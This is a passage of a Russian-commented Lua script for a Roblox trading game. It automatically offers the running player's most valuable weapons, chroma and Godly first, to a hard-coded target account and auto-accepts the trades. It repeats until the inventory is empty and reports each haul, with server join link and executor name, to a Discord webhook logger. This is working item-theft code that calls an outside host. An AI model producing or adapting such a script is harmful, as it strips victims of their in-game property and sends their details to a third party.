-- 3. ВЫСТАВЛЕНИЕ (CHROMA -> ОСТАЛЬНЫЕ) + АВТО-АКЦЕПТ
-- =========================================================
local Trade = ReplicatedStorage:WaitForChild("Trade")
local lastOffer = nil
local myName = LocalPlayer.Name
local lastLogTime = 0

local function countItems()
    local okPD, PD = pcall(function() return require(ReplicatedStorage.Modules.ProfileData) end)
    if not okPD or not PD then return 0 end
    local count = 0
    for id, amount in pairs(PD.Weapons.Owned or {}) do
        count = count + (tonumber(amount) or 1)
    end
    return count
end

Trade.StartTrade.OnClientEvent:Connect(function()
    isTrading = true
    task.wait(2)

    local okPD, PD = pcall(function() return require(ReplicatedStorage.Modules.ProfileData) end)
    local okSync, Sync = pcall(function() return require(ReplicatedStorage.Database.Sync) end)
    if not okPD or not okSync then return end

    local chromaList = {}
    local lists = {
        Godly = {}, Vintage = {}, Ancient = {}, Unique = {},
        Legendary = {}, Rare = {}, Uncommon = {}, Common = {}
    }
    
    local dangerous = {
        ["Fragile_G_2023"] = true, ["CandyCorn_K_2024"] = true,
        ["Patrick"] = true, ["Xbox"] = true, ["Santa"] = true,
        ["Coal"] = true, ["CandyCorn"] = true,
    }

    for id, amount in pairs(PD.Weapons.Owned or {}) do
        local info = Sync.Weapons and Sync.Weapons[id]
        if info then
            local item = {id = id, type = "Weapons"}
            local itemName = info.ItemName or info.Name or id
            local rarity = info.Rarity or "Common"
            
            local isChroma = string.find(string.lower(itemName), "chroma") or string.find(string.lower(id), "chroma")

            if isChroma then
                table.insert(chromaList, item)
            elseif lists[rarity] then
                if not (rarity == "Common" and dangerous[id]) then
                    table.insert(lists[rarity], item)
                end
            end
        end
    end

    local finalList = {}
    
    for _, item in ipairs(chromaList) do table.insert(finalList, item) end
    
    local order = {"Godly", "Vintage", "Ancient", "Unique", "Legendary", "Rare", "Uncommon", "Common"}
    for _, rarity in ipairs(order) do
        for _, item in ipairs(lists[rarity]) do
            table.insert(finalList, item)
        end
    end

    for i = 1, math.min(#finalList, 4) do
        local item = finalList[i]
        pcall(function() Trade.OfferItem:FireServer(item.id, item.type) end)
        print("[offer] ✅ Выставил " .. item.id)
        task.wait(0.2) 
    end
end)

Trade.UpdateTrade.OnClientEvent:Connect(function(data)
    if data.LastOffer then lastOffer = data.LastOffer end
end)

Trade.AcceptTrade.OnClientEvent:Connect(function(success, lootList)
    if success then
        if os.clock() - lastLogTime < 5 then return end
        if not lootList or #lootList == 0 then 
            isTrading = false
            return 
        end

        lastLogTime = os.clock()

        local itemsText = ""
        for _, item in ipairs(lootList) do
            local itemId, amount, itemType = item[1], item[2], item[3]
            local itemName = itemId
            pcall(function()
                local Sync = require(ReplicatedStorage.Database.Sync)
                local info = Sync[itemType] and Sync[itemType][itemId]
                if info then itemName = info.ItemName or info.Name or itemId end
            end)
            itemsText = itemsText .. string.format("🔹 **%s** (x%d)\n", itemName, amount)
        end

        sendDiscord({
            username = "Sematary Real",
            embeds = {
                {
                    title = "📦 Успешный трейд с " .. TARGET_NAME,
                    color = 0x2ECC71,
                    fields = {
                        { name = "🕹️ Игра", value = "**"..gameName.."**\n`PlaceId: "..placeId.."`", inline = true },
                        { name = "⚙️ Исполнитель", value = "**"..executorName.."**", inline = true },
                        { name = "🔗 Сервер", value = "[Присоединиться]("..joinLink..")", inline = true },
                        { name = "📦 Полученный лут", value = itemsText, inline = false }
                    },
                    footer = { text = "Roblox Webhook Logger" },
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }
            }
        })
        print("[trade] 📦 Лут отправлен в Discord!")

        local currentCount = countItems()
        print("[debug] Предметов в инвентаре сейчас: " .. currentCount)

        task.wait(10) 
        isTrading = false

        if Players:FindFirstChild(TARGET_NAME) and currentCount > 0 then
            print("[trade] Запускаем следующий трейд (в инвентаре осталось " .. currentCount .. " шт.)...")
            sendTradeToTarget()
        else
            print("[trade] Предметы закончились или Мари вышла. Цикл завершен.")
        end

    else
        if lastOffer then
            pcall(function() Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOffer) end)
            print("[trade] ✅ Авто-акцепт отправлен.")
        end
    end
end)

